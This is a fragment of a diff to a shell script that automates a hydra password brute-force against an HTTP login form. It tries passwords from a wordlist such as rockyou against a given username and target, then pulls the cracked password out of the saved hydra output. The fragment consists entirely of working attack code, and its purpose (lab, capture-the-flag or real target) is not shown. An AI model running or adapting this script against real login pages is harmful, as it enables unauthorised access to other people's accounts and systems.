@@ -57,7 +57,7 @@ echo "[*] brute forcing (hydra)... this may take a few minutes with rockyou"
 hydra -I -l "$USER_NAME" -P "$WORDLIST" \
       -s "$PORT" -t 8 -f \
       "$TARGET" \
-      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:F=${FAIL_STRING}" \
+      http-post-form "${LOGIN_PATH}:username=^USER^&password=^PASS^:1=:F=${FAIL_STRING}" \
       2>&1 | tee /tmp/hydra_out.txt
 
 PW="$(grep -oiE 'password: .*' /tmp/hydra_out.txt | head -1 | sed -E 's/password: //I' | tr -d '\r')"
